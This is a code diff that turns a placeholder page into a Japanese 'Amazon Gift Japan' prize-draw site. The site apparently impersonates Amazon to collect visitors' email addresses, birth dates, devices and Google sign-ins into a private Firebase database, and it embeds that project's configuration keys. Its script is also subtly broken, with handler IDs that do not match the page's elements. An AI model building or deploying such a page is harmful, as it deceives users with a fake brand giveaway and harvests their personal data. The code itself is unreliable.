@@ -1,10 +1,279 @@
-<!doctype html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <title>Online</title>
-  </head>
-  <body>
-    <h1>Site online</h1>
-  </body>
+<!doctype html><html lang="ja">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Amazonギフト日本</title>
+  <style>
+    html,body{margin:0;padding:0;background:#fff;color:#111827;font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, "Noto Sans JP","Hiragino Kaku Gothic ProN","Yu Gothic UI", sans-serif;}
+    a,button,input,select{font-family:inherit}
+    header{position:sticky;top:0;z-index:10;background:#fff;border-bottom:1px solid #e5e7eb}
+    header .wrap{max-width:420px;margin:0 auto;display:flex;gap:8px;align-items:center;padding:8px 12px}
+    main{max-width:420px;margin:0 auto;padding:0 16px 56px}
+    h1{font-size:22px;margin:16px 0 8px}
+    p{line-height:1.6}
+    button.primary{width:100%;padding:12px 16px;border-radius:999px;background:#f59e0b;color:#fff;border:0;font-weight:700;cursor:pointer}
+    button.google{width:100%;padding:12px 16px;border-radius:999px;background:#2563eb;color:#fff;border:0;font-weight:700;cursor:pointer}
+    section.card{margin-top:16px}
+    label{display:block;margin:12px 0 4px;font-size:14px;font-weight:600}
+    input[type=email],input[type=date],input[type=text],select{width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:10px 12px;font-size:14px}
+    small.muted{color:#6b7280;font-size:12px}
+    footer{max-width:420px;margin:0 auto;padding:24px 16px;text-align:center;color:#6b7280;font-size:14px}
+    footer .links{display:flex;justify-content:center;gap:24px}
+    footer .links a{color:#111827;text-decoration:underline;cursor:pointer}
+    #cats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px}
+    #cats button{padding:8px;border-radius:12px;border:1px solid #e5e7eb;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;font-size:12px}
+    #cats button.active{background:#fff7ed;border-color:#f59e0b}
+    #banner{margin-top:16px;border-radius:16px;overflow:hidden;position:relative;height:160px;background:#f3f4f6;display:flex;align-items:center;justify-content:center}
+    #pages>div{display:none}
+    #pages>div.active{display:block}
+    .bad{color:#dc2626}
+    .chip{padding:8px 10px;border:1px solid #e5e7eb;border-radius:10px;display:inline-block;font-size:12px;background:#fff}
+    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <span style="font-size:22px">🛒</span>
+    <div style="line-height:1">
+      <div style="font-weight:700;font-size:18px">amazon</div>
+      <div style="font-size:11px;color:#f59e0b">gift japan</div>
+    </div>
+  </div>
+</header>
+<div id="pages">
+  <div id="home" class="active">
+    <main>
+      <div id="banner"><span class="chip">Amazonギフトカードを当てよう！</span></div>
+      <h1>Amazonギフトカードを当てよう！</h1>
+      <p>このサイトでは、Amazonギフトカードの抽選に参加できます。参加は無料。以下のボタンから応募してください。</p>
+      <button id="goSignup" class="primary">ギフトカードに応募する</button>
+      <section class="card">
+        <h3 style="font-size:14px;margin:16px 0 8px">人気カテゴリー</h3>
+        <div id="catsHome"></div>
+      </section>
+    </main>
+  </div>
+  <div id="signup">
+    <main>
+      <h1>応募登録</h1>
+      <div class="small">参加方法を選択</div>
+      <form id="form">
+        <label>メールアドレス</label>
+        <input id="email" type="email" placeholder="name@example.com" required/>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
+          <div style="font-size:14px;font-weight:600">カテゴリー</div>
+          <small class="muted">Amazonの主なカテゴリーから一つお選びください。</small>
+        </div>
+        <div id="catsPick"></div>
+        <label>利用デバイス</label>
+        <select id="device" required>
+          <option value="" disabled selected>選択してください</option>
+          <option>iPhone</option>
+          <option>Android</option>
+          <option>Windows</option>
+          <option>Mac</option>
+          <option>iPad</option>
+          <option>その他</option>
+        </select>
+        <label>生年月日</label>
+        <input id="dob" type="date" required/>
+        <label>きっかけ（例：チラシ、バナーなど）</label>
+        <input id="origin" type="text" placeholder="チラシ / バナー / 友人の紹介 など"/>
+        <div id="err" class="bad"></div>
+        <button class="primary" type="submit">登録して確認メールを送信</button>
+      </form>
+      <div style="display:flex;align-items:center;gap:8px;margin:16px 0">
+        <div style="flex:1;height:1px;background:#e5e7eb"></div>
+        <div class="muted" style="font-size:12px">または</div>
+        <div style="flex:1;height:1px;background:#e5e7eb"></div>
+      </div>
+      <button id="googleBtn" class="google">Googleで登録</button>
+      <p class="muted" style="margin-top:12px">※ メール登録の場合、確認用リンクをお送りします。リンクを開いて登録を完了してください。</p>
+    </main>
+  </div>
+  <div id="confirm">
+    <main>
+      <h1>あと少しで完了！</h1>
+      <p>確認用メールを送信しました。メール内のリンクを開いて登録を完了してください。</p>
+      <div id="confirmEmail" class="chip" style="margin-top:12px"></div>
+      <div class="grid2" style="margin-top:16px">
+        <button id="resend" class="primary">メールを再送する</button>
+        <button id="change" class="primary" style="background:#fff;color:#111827;border:1px solid #e5e7eb">メールアドレスを変更</button>
+      </div>
+    </main>
+  </div>
+  <div id="final">
+    <main>
+      <h1>ご登録ありがとうございます！</h1>
+      <p>今後の抽選やお知らせはメールにてご連絡いたします。</p>
+      <div style="margin-top:16px">
+        <div style="font-size:14px;font-weight:700">当選確率を上げるコツ</div>
+        <ul style="margin:8px 0 0 18px;color:#374151">
+          <li>友だちとシェアする（紹介ボーナスありの場合）</li>
+          <li>公式SNSをフォローする</li>
+          <li>メールの受信設定（@example.com）を許可する</li>
+        </ul>
+      </div>
+      <div class="muted" style="border:1px solid #e5e7eb;border-radius:12px;padding:12px;margin-top:18px;font-size:12px">※ 登録情報は厳重に管理され、抽選の運用にのみ利用します。</div>
+    </main>
+  </div>
+</div>
+<footer>
+  <div class="links">
+    <a id="terms">利用規約</a>
+    <a id="privacy">プライバシーポリシー</a>
+    <a id="contact">お問い合わせ</a>
+  </div>
+  <div style="margin-top:10px;font-size:12px;color:#9ca3af">© <span id="yy"></span> Amazon Gift Japan</div>
+</footer>
+<div id="modals" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.4);display:flex;align-items:flex-end;justify-content:center">
+  <div style="background:#fff;width:100%;max-width:420px;border-top-left-radius:16px;border-top-right-radius:16px;padding:16px">
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div id="modalTitle" style="font-size:18px;font-weight:700"></div>
+      <button id="closeModal" style="border:0;background:transparent;font-size:18px;color:#6b7280">✕</button>
+    </div>
+    <div id="modalBody" style="margin-top:12px;color:#374151;font-size:14px"></div>
+  </div>
+</div>
+<!-- Firebase SDKs -->
+
+
+  <script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+import { getAuth, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
+import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDc38J7B44WGtrVLITTUNK1BW1WMWHCRXs",
+  authDomain: "gift-16201.firebaseapp.com",
+  projectId: "gift-16201",
+  storageBucket: "gift-16201.appspot.com",
+  messagingSenderId: "407279162898",
+  appId: "1:407279162898:web:45f7c3f0c410380bf5aacb",
+  measurementId: "G-88NSX88FF7"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+
+function getAppUrl() {
+  return "https://gift-16201.web.app/";
+}
+
+function showPage(pageId) {
+  ['home','signup','confirm','final'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      if (id === pageId) {
+        el.classList.add('active');
+      } else {
+        el.classList.remove('active');
+      }
+    }
+  });
+}
+
+// event listeners
+document.getElementById('gosignup').addEventListener('click', () => {
+  showPage('signup');
+});
+
+document.getElementById('submit').addEventListener('click', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const category = document.getElementById('catsPick').value;
+  const device = document.getElementById('device').value;
+  const dob = document.getElementById('dob').value;
+  const origin = document.getElementById('origin').value;
+  if (!email) {
+    alert('メールアドレスを入力してください。');
+    return;
+  }
+  const info = { email, category, device, dob, origin };
+  localStorage.setItem('signupInfo', JSON.stringify(info));
+  try {
+    await sendSignInLinkToEmail(auth, email, { url: getAppUrl(), handleCodeInApp: true });
+    // show confirm page
+    const confirmEmailEl = document.getElementById('confirmEmail');
+    if (confirmEmailEl) {
+      confirmEmailEl.innerText = email;
+    }
+    showPage('confirm');
+  } catch (err) {
+    console.error(err);
+    alert('メール送信に失敗しました: ' + err.message);
+  }
+});
+
+document.getElementById('resend').addEventListener('click', async () => {
+  const infoStr = localStorage.getItem('signupInfo');
+  if (infoStr) {
+    const info = JSON.parse(infoStr);
+    await sendSignInLinkToEmail(auth, info.email, { url: getAppUrl(), handleCodeInApp: true });
+    alert('確認リンクを再送しました。');
+  }
+});
+
+document.getElementById('change').addEventListener('click', () => {
+  showPage('signup');
+});
+
+document.getElementById('googletn').addEventListener('click', async () => {
+  const provider = new GoogleAuthProvider();
+  let info = {};
+  const infoStr = localStorage.getItem('signupInfo');
+  if (infoStr) {
+    info = JSON.parse(infoStr);
+  }
+  try {
+    const result = await signInWithPopup(auth, provider);
+    const user = result.user;
+    await setDoc(doc(db, 'entries', user.uid), {
+      ...info,
+      email: user.email,
+      method: 'google',
+      createdAt: serverTimestamp()
+    });
+    localStorage.removeItem('signupInfo');
+    showPage('final');
+  } catch (err) {
+    console.error(err);
+    alert('Googleログインに失敗しました: ' + err.message);
+  }
+});
+
+// On load, check for email sign-in
+if (isSignInWithEmailLink(auth, window.location.href)) {
+  let infoStr = localStorage.getItem('signupInfo');
+  let email = '';
+  if (infoStr) {
+    email = JSON.parse(infoStr).email;
+  } else {
+    email = window.prompt('メールアドレスを入力してください。');
+  }
+  signInWithEmailLink(auth, email, window.location.href)
+    .then(async (result) => {
+      const user = result.user;
+      let info = {};
+      if (infoStr) {
+        info = JSON.parse(infoStr);
+      }
+      await setDoc(doc(db, 'entries', user.uid), {
+        ...info,
+        email: user.email,
+        method: 'email',
+        createdAt: serverTimestamp()
+      });
+      localStorage.removeItem('signupInfo');
+      showPage('final');
+    })
+    .catch((error) => {
+      console.error(error);
+    });
+}
+</script>
+</body>
 </html>
